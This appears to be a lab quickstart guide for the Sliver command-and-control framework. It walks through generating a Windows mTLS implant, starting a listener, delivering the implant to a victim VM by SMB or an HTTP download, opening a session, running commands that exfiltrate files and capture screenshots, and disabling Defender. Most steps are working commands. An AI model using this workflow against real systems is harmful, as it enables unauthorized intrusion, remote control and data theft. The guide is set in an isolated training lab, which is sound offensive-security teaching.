# Sliver Quickstart — first implant & session

Prereq: attacker VM set up (`lab/setup-attacker.sh`), victim VM running
on the host-only network. Everything below happens **from the attacker
VM**, targeting machines you own. The implant is generated _on the
attacker_, executed _on the victim_ — that's the mTLS and session flow.

## 1. Start the Sliver server

```bash
sliver
```

On first run it creates the operator config. The interactive console
(`sliver >`) is your C2 interface. `help` is your friend.

## 2. Generate an implant (mTLS, Windows)

From the Sliver console:

```
generate --mtls 192.168.56.10 --os windows --arch amd64 --save /tmp/
```

What this does:

| Flag                        | Meaning                                                       |
| --------------------------- | ------------------------------------------------------------- |
| `--mtls 192.168.56.10`      | implant phones home to this listener over mutual TLS          |
| `--os windows --arch amd64` | build a Windows x64 payload                                   |
| `--save /tmp/`              | drop the binary at `/tmp/` (default name `SOME_FUN_NAME.exe`) |

The output prints the generated implant name (randomized each build).

> Implants are **compiled per-binary with their own keys** — that's why
> you must generate a fresh one per target/build. This is the "dynamic
> code generation" feature.

## 3. Start the mTLS listener

```
mtls
```

Output: `[*] Starting mTLS listener ... [OK]`.

## 4. Get the implant onto the victim

You _own_ the victim, so any transfer works. Classic lab options:

```bash
# From attacker VM, if you have creds (SMB/PSExec style):
smbclient -U <user> //192.168.56.20/C$ /tmp/implant.exe
# or a quick HTTP server + PowerShell on the victim:
cd /tmp && python3 -m http.server 8000
# on the victim:  Invoke-WebRequest http://192.168.56.10:8000/implant.exe -OutFile $env:TEMP\implant.exe
```

Then execute on the victim (PowerShell):

```powershell
C:\Users\<you>\Downloads\implant.exe   # or full path
```

## 5. Catch the session

Back in the Sliver console, within seconds:

```
[*] Session 12345ab ... 192.168.56.20 (WIN-LAB) - windows/amd64
sessions
```

`sessions` lists them. Interact:

```
sessions -i 12345ab     # attach to session 12345ab
```

You're now at `sliver (implant name) >`. You have shell on the victim.

## 6. First commands to try (on the session)

```
info                 # implant + transport details
whoami               # OS user context
getuid
ifconfig             # victim network interfaces
ps                   # process list
ls C:\Users\
download C:\Users\lab\Desktop\catatan.txt
screenshot           # (wait, then use it to view)
ping                 # implant↔server latency + exit
exit                 # kill the session gracefully
```

The Sliver docs page for commands: `https://sliver.sh/docs?name=Command+Reference`
(hit "Skip to main content" to see the table on the JS site, or use
`help` in-console which lists everything).

## 7. Cleanup

```
jobs                  # list listeners
kill 12345ab          # kill session
```

Then delete the implant binary from the victim. Restore the snapshot
you took in `setup-victims.md` when done.

---

## Common hiccups

| Symptom                                         | Fix                                                                                                                                      |
| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| Implant never checks in                         | Listener not running (`mtls`), wrong port, or victim can't route to `192.168.56.10` — check `ping` + `ipconfig`/`ip a` on both           |
| Windows flags the binary                        | It's malware-frameworks' nature; Defender will alert. That's _realistic_ — try the detection side, or disable Defender on the lab victim |
| `generate` errors about missing cross-compilers | `generate` handles cross-compile automatically; if you see Go errors, update Sliver (`sliver update`)                                    |

Next: `msf-quickstart.md`
